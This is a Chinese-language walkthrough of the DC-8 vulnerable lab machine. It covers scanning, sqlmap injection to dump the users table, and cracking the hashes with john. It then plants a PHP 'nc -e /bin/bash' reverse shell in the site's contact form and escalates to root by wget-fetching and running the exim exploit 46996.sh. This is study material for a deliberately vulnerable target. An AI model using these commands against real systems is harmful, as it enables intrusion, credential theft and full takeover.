---
title:  DC-8靶机
index: true
isOriginal : true
category:
  - 靶机
tag:
  - 靶机
---
1. 主机扫描使用arp-scan扫描工具  --localnet 扫描本地网络

    ![image](assets/image-20240823161457-pgp6fgl.png)

    ​`.1`​（通常是网关或路由器的地址）和`.255`​（广播地址）。而`.254`​ 经常被用作子网内的一个特殊设备（如DHCP服务器）的地址，但这不是一个固定的规则.
2. 使用Nmap端口扫描   -sV：探测开放端口以确定服务/版本信息；

    ​ **​`-p-`​** ​：这个选项告诉 Nmap 扫描目标上所有可能的端口（从 1 到 65535）。默认情况下，Nmap 只会扫描一些常见的端口，但使用 `-p-`​ 选项可以确保扫描所有端口

    ![image](assets/image-20240823161554-59k6g0p.png)
3. 使用dirsearch扫描目录 python3 dirsearch.py -u [target_url]  # 攻击目标url地址

    dirsearch -u 192.18.142 -e * -x 403 --random-agent

    ​`-e *`​ 参数表示使用所有内置的扩展名列表进行扫描

    ​`--random-agent`​ 在请求时使用随机的用户代理字符串，这有助于<span data-type="text" style="color: var(--b3-font-color11);">绕过</span>一些基于用户代理的访问控制或<span data-type="text" style="color: var(--b3-font-color11);">日志记录</span>。

    ​`-x 403`​ 参数在这里可能是想排除状态码为 403 Forbidden 的响应。

    ![image](assets/image-20240823161920-y7ou5i0.png)
4. 访问网站

    ![image](assets/image-20240823162555-zfdjykf.png)
5. 发现注入点

    ![image](assets/image-20240823162532-moh29a0.png)
6. sqlmap扫描

    ![image](assets/image-20240823162853-06gw6ag.png)
7. 发现存在注入

    布尔盲注、报错注入、时间盲注、联合查询

    ![image](assets/image-20240823162947-k74bvu6.png)
8. 扫描数据库

    sqlmap -u "http://192.168.18.142/?nid=1"<span data-type="text" style="color: var(--b3-font-color8);"> -dbs</span>

    ![image](assets/image-20240823163129-0rrigwx.png)

    ![image](assets/image-20240823163206-f78hkpj.png)
9. 根据数据库名扫描表

    sqlmap -u "http://192.168.18.142/?nid=1" -D d7db <span data-type="text" style="color: var(--b3-font-color8);">-tables</span>

    ![image](assets/image-20240823163307-9ifd68j.png)

    ![image](assets/image-20240823163507-clhbqmd.png)
10. 扫描users表

     ![image](assets/image-20240823163725-wpe8utp.png)

     得到后台账密

     ![image](assets/image-20240823163902-i0kh8wr.png)
11. 将密码复制出来保存到adpass.txt和johnpass.txt文件中，然后使用john工具进行爆破

     ![image](assets/image-20240823165442-hr30qfa.png)
12. 得到账户john的密码为turtle，账户admin的密码无法爆破

     使用dirb命令`dirb http://192.168.18.142`​  <span data-type="text" style="color: var(--b3-font-color9);">扫描网站目录和文件</span>

     dirb http://192.168.18.142

     ![image](assets/image-20240823165602-cbhqw6y.png)

     #### robots.txt

     是一个纯文本文件，在这个文件中网站管理者可以声明该网站中不想被robots访问的部分，robots.txt 文件规定了搜索引擎抓取工具可以访问您网站上的哪些网址。或者指定搜索引擎只收录指定的内容。

     当一个搜索机器人（有的叫搜索蜘蛛）访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt
13. 登录上方页面找到登录地址

     ![image](assets/image-20240823165842-fy4d899.png)
14. 根据地址找到登录页面并登录

     ![image](assets/image-20240823170301-a66hd2d.png)
15. 然后将反弹shell的命令`  <?php system("nc -e /bin/bash 192.168.172.131 1234"); ?>   `IP地址为kali的IP地址  nc反向shell

     System()函数的主要功能是在系统权限允许的情况是执行系统命令
     ![image](assets/image-20240823170751-7fzsrm6.png)
16. 监听靶机

     ![image](assets/image-20240823171255-v45evn7.png)
17. 然后回到网站contact us的view页面，随便输入一些信息然后点击【submit】就可以反弹回shell

     ![image](assets/image-20240823171414-sf0oshv.png)
18. ![image](assets/image-20240823172027-9blx3e1.png)
19. 此时的shell不是交互式shell，所以使用命令`python -c "import pty; pty.spawn('/bin/bash')"`​获取一个交互式的shell

     ![image](assets/image-20240823172120-87zrua0.png)
20. 查看可以用于suid提权的命令    `find / -user root -perm -4000 -print 2>/dev/null`​ ★★

     * ​`find /`​：`find`​命令用于在目录树中搜索文件，并可以对搜索结果执行操作。这里的`/`​表示从<span data-type="text" style="color: var(--b3-font-color9);">根目录开始搜索整个系统</span>。
     * ​`-user root`​：这个选项告诉`find`​命令<span data-type="text" style="color: var(--b3-font-color9);">只查找属于用户</span>`root`​​​<span data-type="text" style="color: var(--b3-font-color9);">的文件</span>。`root`​是Linux系统中的超级用户，拥有对系统的完全访问权限。
     * ​`-perm -4000`​：这个选项用于查找具有特定权限的文件。`-perm`​后面跟的数字或符号<span data-type="text" style="color: var(--b3-font-color8);">表示文件的权限</span>。在这里，`-4000`​是一个特殊的权限位，它代表设置用户ID（<span data-type="text" style="color: var(--b3-font-color9);">SUID</span>）权限。当一个可执行文件具有SUID权限时，<span data-type="text" style="color: var(--b3-font-color10);">用户执行该文件时将以文件所有者的身份运行</span>（在这个例子中是`root`​）。这允许普通用户执行通常需要更高权限的操作。然
     * ​`-print`​：<u>​`find`​</u>​<u>命令默认会将找到的文件名输出到标准输出（通常是屏幕）。</u>​<u>​`-print`​</u>​<u>选项实际上在这里是隐式的，但明确写出来可以增强命令的可读性</u>。它告诉`find`​命令打印出找到的每个文件的路径。
     * ​`2>/dev/null`​：★★★**这部分是重定向的一部分**，用于处理错误消息。在shell中，`2`​​​​ <span data-type="text" style="color: var(--b3-font-color9);">代表标准错误</span>（stderr），而`>`​是重定向操作符。`/dev/null`​​​​ <span data-type="text" style="color: var(--b3-card-warning-color); background-color: var(--b3-card-warning-background);">是一个特殊的设备文件，通常被称为“空设备”或“黑洞”</span>。写入它的任何数据都会被丢弃，读取它时通常立即返回文件结束。因此，`2>/dev/null`​的意思是将<span data-type="text" style="background-color: var(--b3-font-background9);">所有标准错误输出重定向到</span>`/dev/null`​​​，这样就不会在屏幕上显示任何错误信息了。这对于<span data-type="text" style="color: var(--b3-font-color11);">忽略那些由于权限不足而无法访问的目录的错误消息</span>特别有用。

     ![image](assets/image-20240823172252-o2lclm6.png)
21. 发现一个比较奇怪的命令exim4，先查看一下命令版本   `/usr/sbin/exim4 --version`​

     ![image](assets/image-20240823172420-yd4wu1x.png)
22. ​`searchsploit exim 4`​     搜索可以利用的提权方法  选择使用46996.sh

     ![image](assets/image-20240823172747-pqj5ktm.png)
23. 使用靶机的wget命令将该脚本下载到靶机中，先将kali机的apache服务开启，命令`service apache2 start`​

     ![image](assets/image-20240823172859-ur2bqaa.png)
24. 将攻击脚本文件复制到Apache服务的根目录/var/www/html下，命令`cp /usr/share/exploitdb/exploits/linux/local/46996.sh /var/www/html/exp.sh`​

     ![image](assets/image-20240823172945-sucs3r3.png)
25. 在kali中使用set ff\=unix，告诉编译器，使用unix换行符，否则会无法使用脚本

     ![image](assets/image-20240823173330-wc4zp7y.png)

     ![image](assets/image-20240823173307-w46564x.png)
26. 在靶机反弹回来的shell处使用命令`wget http://192.168.172.131/exp.sh`​将脚本下载到靶机中

     由于前面目录没有权限所以换目录下载

     ![image](assets/image-20240823173820-3kumopa.png)

     ![image](assets/image-20240823173738-qnfdsv5.png)
27. 成功将exp.sh下载到靶机中，但是发现没有执行权限，使用命令`chmod +x exp.sh`​赋予脚本执行权限，并使用命令`./exp.sh -m netcat`​来执行脚本

     ![image](assets/image-20240823174320-u097but.png)

     ![image](assets/image-20240823175056-6wkl2da.png)
28. 提权成功，跳转到/root目录下即可查看flag

     ![image](assets/image-20240823175333-e6jwa9f.png)

‍
